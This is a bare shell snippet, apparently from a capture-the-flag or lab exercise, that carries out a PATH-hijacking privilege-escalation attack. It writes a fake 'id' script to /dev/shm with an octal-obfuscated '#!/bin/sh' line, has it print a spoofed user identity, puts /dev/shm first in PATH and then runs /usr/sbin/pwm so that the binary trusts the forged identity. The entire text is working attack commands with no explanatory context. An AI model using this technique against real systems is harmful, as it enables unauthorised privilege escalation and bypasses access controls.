
echo '\43\41/bin/\163\150' > /dev/shm/id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /dev/shm/id
chmod 755 /dev/shm/id

export PATH=/dev/shm:$PATH ; /usr/sbin/pwm

